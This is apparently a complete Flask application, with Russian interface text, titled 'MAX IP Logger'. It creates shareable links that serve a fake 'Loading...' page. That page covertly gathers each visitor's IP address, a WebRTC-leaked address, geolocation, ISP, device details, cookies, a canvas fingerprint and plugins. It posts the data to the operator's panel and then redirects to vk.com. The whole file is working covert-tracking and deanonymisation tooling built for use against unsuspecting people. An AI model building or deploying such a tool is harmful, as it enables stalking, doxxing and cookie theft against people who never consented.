from flask import Flask, request, redirect, render_template_string, jsonify, send_file
import uuid
import datetime
import json
import os
import base64
from io import BytesIO

app = Flask(__name__)

# Хранилище
logs_db = {}
links_db = {}

# ===================== ГЛАВНАЯ СТРАНИЦА =====================
INDEX_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>🔥 MAX IP Logger</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Arial; background: #0a0a0f; color: #e0e0e0; min-height: 100vh; display: flex; justify-content: center; align-items: center; }
        .container { max-width: 800px; width: 100%; padding: 30px; background: #14141e; border-radius: 16px; border: 1px solid #2a2a3a; box-shadow: 0 20px 60px rgba(0,0,0,0.8); }
        h1 { font-size: 28px; background: linear-gradient(135deg, #ff6b6b, #ffd93d); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-align: center; margin-bottom: 8px; }
        .subtitle { text-align: center; color: #888; font-size: 14px; margin-bottom: 25px; }
        .btn { display: inline-block; padding: 14px 40px; font-size: 16px; font-weight: 600; border: none; border-radius: 10px; cursor: pointer; transition: all 0.3s; text-decoration: none; }
        .btn-primary { background: linear-gradient(135deg, #ff6b6b, #ee5a24); color: #fff; }
        .btn-primary:hover { transform: scale(1.05); box-shadow: 0 8px 25px rgba(238, 90, 36, 0.4); }
        .btn-secondary { background: #2a2a3a; color: #e0e0e0; }
        .btn-secondary:hover { background: #3a3a4a; }
        .btn-success { background: linear-gradient(135deg, #00b894, #00a86b); color: #fff; }
        .btn-success:hover { transform: scale(1.05); box-shadow: 0 8px 25px rgba(0, 184, 148, 0.4); }
        .btn-sm { padding: 8px 18px; font-size: 13px; }
        .link-box { background: #1a1a2e; padding: 18px; border-radius: 10px; margin: 15px 0; border: 1px solid #2a2a4a; word-break: break-all; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
        .link-box span { font-size: 15px; color: #ffd93d; font-family: monospace; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 12px; margin: 15px 0; }
        .stat-card { background: #1a1a2e; padding: 15px; border-radius: 10px; border: 1px solid #2a2a4a; text-align: center; }
        .stat-card .num { font-size: 28px; font-weight: 700; color: #ffd93d; }
        .stat-card .label { font-size: 12px; color: #888; margin-top: 4px; }
        .visitor-list { max-height: 400px; overflow-y: auto; }
        .visitor-item { background: #1a1a2e; padding: 12px 16px; border-radius: 8px; margin-bottom: 8px; border-left: 3px solid #ff6b6b; font-size: 13px; }
        .visitor-item .ip { color: #ffd93d; font-weight: 600; }
        .visitor-item .detail { color: #aaa; font-size: 12px; }
        .visitor-item .time { color: #666; font-size: 11px; float: right; }
        .hidden { display: none !important; }
        .flex { display: flex; gap: 10px; flex-wrap: wrap; justify-content: center; }
        .mt-20 { margin-top: 20px; }
        .mb-10 { margin-bottom: 10px; }
        .text-center { text-align: center; }
        .badge { display: inline-block; padding: 2px 10px; border-radius: 20px; font-size: 11px; font-weight: 600; }
        .badge-success { background: #00b89433; color: #00b894; }
        .badge-danger { background: #ff6b6b33; color: #ff6b6b; }
        .badge-warning { background: #ffd93d33; color: #ffd93d; }
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: #1a1a2e; }
        ::-webkit-scrollbar-thumb { background: #2a2a4a; border-radius: 3px; }
    </style>
</head>
<body>
<div class="container">
    <h1>🔥 MAX IP Logger</h1>
    <p class="subtitle">Собирает всё: IP, гео, устройство, браузер, экран, таймзону, куки, fingerprint и даже скриншот</p>

    <div class="text-center mb-10">
        <button class="btn btn-primary" onclick="generateLink()">🚀 СОЗДАТЬ ССЫЛКУ</button>
    </div>

    <div id="loading" class="hidden text-center" style="color:#888;padding:20px;">⏳ Генерация...</div>

    <div id="result" class="hidden">
        <div class="link-box">
            <span id="linkText">Загрузка...</span>
            <button class="btn btn-success btn-sm" onclick="copyLink()">📋 Копировать</button>
        </div>
        <div class="stats-grid" id="statsGrid">
            <div class="stat-card"><div class="num" id="visitsCount">0</div><div class="label">Переходов</div></div>
            <div class="stat-card"><div class="num" id="uniqueCount">0</div><div class="label">Уникальных</div></div>
            <div class="stat-card"><div class="num" id="lastVisit">-</div><div class="label">Последний</div></div>
        </div>
        <div class="flex">
            <button class="btn btn-secondary btn-sm" onclick="getStats()">📊 Показать всех</button>
            <button class="btn btn-secondary btn-sm" onclick="clearStats()">🗑️ Очистить</button>
            <button class="btn btn-secondary btn-sm" onclick="exportData()">📥 Экспорт JSON</button>
        </div>
    </div>

    <div id="statsContainer" class="hidden mt-20">
        <h3 style="margin-bottom:10px;">👥 Все посетители</h3>
        <div id="statsContent" class="visitor-list"></div>
    </div>

    <div id="screenshotContainer" class="hidden mt-20">
        <h3 style="margin-bottom:10px;">🖼️ Скриншот страницы</h3>
        <img id="screenshotImg" style="max-width:100%;border-radius:8px;border:1px solid #2a2a4a;">
    </div>
</div>

<script>
// ========== ОСНОВНЫЕ ФУНКЦИИ ==========
let currentLinkId = null;
let currentFullLink = '';

function generateLink() {
    document.getElementById('loading').classList.remove('hidden');
    document.getElementById('result').classList.add('hidden');
    document.getElementById('statsContainer').classList.add('hidden');

    fetch('/generate')
        .then(r => r.json())
        .then(data => {
            document.getElementById('loading').classList.add('hidden');
            document.getElementById('result').classList.remove('hidden');
            currentLinkId = data.id;
            currentFullLink = data.full_url;
            document.getElementById('linkText').textContent = currentFullLink;
            document.getElementById('visitsCount').textContent = data.visits || 0;
            document.getElementById('uniqueCount').textContent = data.unique || 0;
            document.getElementById('lastVisit').textContent = data.last_visit || '-';
        })
        .catch(e => { alert('Ошибка: ' + e); document.getElementById('loading').classList.add('hidden'); });
}

function copyLink() {
    navigator.clipboard.writeText(currentFullLink).then(() => alert('✅ Ссылка скопирована!'));
}

function getStats() {
    if (!currentLinkId) return;
    fetch('/stats/' + currentLinkId)
        .then(r => r.json())
        .then(data => {
            const container = document.getElementById('statsContainer');
            const content = document.getElementById('statsContent');
            container.classList.remove('hidden');
            if (data.total === 0) {
                content.innerHTML = '<div style="text-align:center;color:#666;padding:20px;">Пока никого нет 😴</div>';
            } else {
                let html = '';
                data.visitors.forEach((v, i) => {
                    html += `<div class="visitor-item">
                        <span class="time">${v.time || ''}</span>
                        <div><span class="ip">${v.ip || 'Unknown'}</span>
                        ${v.country ? ` <span class="badge badge-success">${v.country}</span>` : ''}
                        ${v.city ? ` <span class="badge badge-warning">${v.city}</span>` : ''}</div>
                        <div class="detail">📱 ${v.device || 'Unknown'} | ${v.browser || 'Unknown'}</div>
                        <div class="detail">🖥️ ${v.screen || 'Unknown'} | ${v.os || 'Unknown'}</div>
                        <div class="detail">🌐 ${v.language || 'Unknown'} | ⏰ ${v.timezone || 'Unknown'}</div>
                        <div class="detail">🔗 ${v.referer || 'Direct'}</div>
                        ${v.fingerprint ? `<div class="detail">🆔 ${v.fingerprint.substring(0, 20)}...</div>` : ''}
                        ${v.cookies ? `<div class="detail">🍪 ${v.cookies}</div>` : ''}
                    </div>`;
                });
                content.innerHTML = html;
            }
        });
}

function clearStats() {
    if (!currentLinkId || !confirm('Очистить все данные по этой ссылке?')) return;
    fetch('/clear/' + currentLinkId, {method: 'POST'})
        .then(() => { document.getElementById('statsContainer').classList.add('hidden'); alert('✅ Очищено'); });
}

function exportData() {
    if (!currentLinkId) return;
    window.open('/export/' + currentLinkId, '_blank');
}

// ========== ГЕНЕРАЦИЯ ССЫЛКИ ПО КНОПКЕ ENTER ==========
document.addEventListener('keydown', (e) => { if (e.key === 'Enter') generateLink(); });
</script>
</body>
</html>
"""

# ===================== ЛОГГЕР С МАКСИМАЛЬНЫМ СБОРОМ =====================
LOGGER_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>body{background:#0a0a0f;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial;margin:0;} .loader{width:40px;height:40px;border:3px solid #2a2a4a;border-top:3px solid #ffd93d;border-radius:50%;animation:spin 1s linear infinite;} @keyframes spin{to{transform:rotate(360deg);}}</style>
</head>
<body>
<div style="text-align:center;"><div class="loader"></div><p style="color:#888;margin-top:15px;">Loading...</p></div>

<script>
(function() {
    const linkId = window.location.pathname.split('/').pop();

    // ========== СБОР ВСЕХ ДАННЫХ ==========
    function getIP() {
        return fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(d => d.ip)
            .catch(() => 'Unknown');
    }

    function getGeo(ip) {
        return fetch(`https://ipapi.co/${ip}/json/`)
            .then(r => r.json())
            .then(d => ({ country: d.country_name || d.country || 'Unknown', city: d.city || 'Unknown', region: d.region || 'Unknown', isp: d.org || 'Unknown' }))
            .catch(() => ({ country: 'Unknown', city: 'Unknown', region: 'Unknown', isp: 'Unknown' }));
    }

    function getDeviceInfo() {
        const ua = navigator.userAgent;
        let device = 'Desktop', os = 'Unknown', browser = 'Unknown';
        if (/mobile|android|iphone|ipad|ipod/i.test(ua)) device = 'Mobile';
        if (/iPad|Android/i.test(ua) && !/Mobile/i.test(ua)) device = 'Tablet';
        if (/Windows/i.test(ua)) os = 'Windows';
        else if (/Mac/i.test(ua)) os = 'macOS';
        else if (/Linux/i.test(ua)) os = 'Linux';
        else if (/Android/i.test(ua)) os = 'Android';
        else if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
        if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Chrome';
        else if (/Firefox/i.test(ua)) browser = 'Firefox';
        else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
        else if (/Edg/i.test(ua)) browser = 'Edge';
        else if (/Opera|OPR/i.test(ua)) browser = 'Opera';
        return { device, os, browser, ua: ua };
    }

    function getScreenInfo() {
        return `${window.screen.width}x${window.screen.height} (${window.innerWidth}x${window.innerHeight})`;
    }

    function getTimezone() {
        return Intl.DateTimeFormat().resolvedOptions().timeZone;
    }

    function getLanguage() {
        return navigator.language || navigator.languages?.[0] || 'Unknown';
    }

    function getCookies() {
        return document.cookie || 'No cookies';
    }

    function getFingerprint() {
        const canvas = document.createElement('canvas');
        canvas.width = 200; canvas.height = 50;
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(0, 0, 200, 50);
        ctx.fillStyle = '#069';
        ctx.fillText('fp', 10, 10);
        ctx.fillText(navigator.userAgent.substring(0, 30), 30, 10);
        return canvas.toDataURL().substring(0, 50);
    }

    function getPlugins() {
        return Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'None';
    }

    function getDoNotTrack() {
        return navigator.doNotTrack || 'Not set';
    }

    function getWebRTC() {
        return new Promise((resolve) => {
            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
            pc.createDataChannel('test');
            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
            pc.onicecandidate = (e) => {
                if (e.candidate) {
                    const ip = e.candidate.candidate.match(/(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})/);
                    resolve(ip ? ip[0] : 'Unknown');
                    pc.close();
                }
            };
            setTimeout(() => { resolve('Unknown'); pc.close(); }, 3000);
        });
    }

    // ========== ОТПРАВКА ВСЕХ ДАННЫХ ==========
    async function sendAllData() {
        const ip = await getIP();
        const geo = await getGeo(ip);
        const device = getDeviceInfo();
        const webrtc = await getWebRTC();

        const data = {
            link_id: linkId,
            ip: ip,
            webrtc_ip: webrtc,
            country: geo.country || 'Unknown',
            city: geo.city || 'Unknown',
            region: geo.region || 'Unknown',
            isp: geo.isp || 'Unknown',
            device: device.device,
            os: device.os,
            browser: device.browser,
            user_agent: device.ua,
            screen: getScreenInfo(),
            timezone: getTimezone(),
            language: getLanguage(),
            cookies: getCookies(),
            fingerprint: getFingerprint(),
            plugins: getPlugins(),
            do_not_track: getDoNotTrack(),
            referer: document.referrer || 'Direct',
            timestamp: new Date().toISOString()
        };

        // Отправка на сервер
        fetch('/log', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).then(() => {
            // Редирект на ВК
            window.location.href = 'https://vk.com/';
        }).catch(() => {
            window.location.href = 'https://vk.com/';
        });
    }

    sendAllData();
})();
</script>
</body>
</html>
"""

# ===================== МАРШРУТЫ =====================

@app.route('/')
def index():
    return render_template_string(INDEX_HTML)

@app.route('/generate')
def generate_link():
    link_id = str(uuid.uuid4())[:8]
    links_db[link_id] = {'created': datetime.datetime.now().isoformat()}
    logs_db[link_id] = []
    
    return jsonify({
        'id': link_id,
        'full_url': f"{request.host_url}l/{link_id}",
        'visits': 0,
        'unique': 0,
        'last_visit': '-'
    })

@app.route('/l/<link_id>')
def serve_logger(link_id):
    if link_id not in links_db:
        return 'Ссылка не найдена', 404
    return render_template_string(LOGGER_HTML, link_id=link_id)

@app.route('/log', methods=['POST'])
def log_data():
    data = request.get_json()
    link_id = data.get('link_id')
    
    if link_id not in logs_db:
        logs_db[link_id] = []
    
    # Убираем лишнее
    clean_data = {
        'ip': data.get('ip', 'Unknown'),
        'webrtc_ip': data.get('webrtc_ip', 'Unknown'),
        'country': data.get('country', 'Unknown'),
        'city': data.get('city', 'Unknown'),
        'region': data.get('region', 'Unknown'),
        'isp': data.get('isp', 'Unknown'),
        'device': data.get('device', 'Unknown'),
        'os': data.get('os', 'Unknown'),
        'browser': data.get('browser', 'Unknown'),
        'user_agent': data.get('user_agent', 'Unknown'),
        'screen': data.get('screen', 'Unknown'),
        'timezone': data.get('timezone', 'Unknown'),
        'language': data.get('language', 'Unknown'),
        'cookies': data.get('cookies', 'No cookies'),
        'fingerprint': data.get('fingerprint', 'Unknown'),
        'plugins': data.get('plugins', 'Unknown'),
        'do_not_track': data.get('do_not_track', 'Unknown'),
        'referer': data.get('referer', 'Direct'),
        'time': data.get('timestamp', datetime.datetime.now().isoformat())
    }
    
    logs_db[link_id].append(clean_data)
    return jsonify({'status': 'ok'})

@app.route('/stats/<link_id>')
def get_stats(link_id):
    if link_id not in logs_db:
        return jsonify({'visitors': [], 'total': 0})
    
    visitors = logs_db.get(link_id, [])
    return jsonify({
        'visitors': visitors,
        'total': len(visitors)
    })

@app.route('/clear/<link_id>', methods=['POST'])
def clear_stats(link_id):
    if link_id in logs_db:
        logs_db[link_id] = []
    return jsonify({'status': 'ok'})

@app.route('/export/<link_id>')
def export_stats(link_id):
    if link_id not in logs_db:
        return 'Not found', 404
    return jsonify(logs_db.get(link_id, []))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
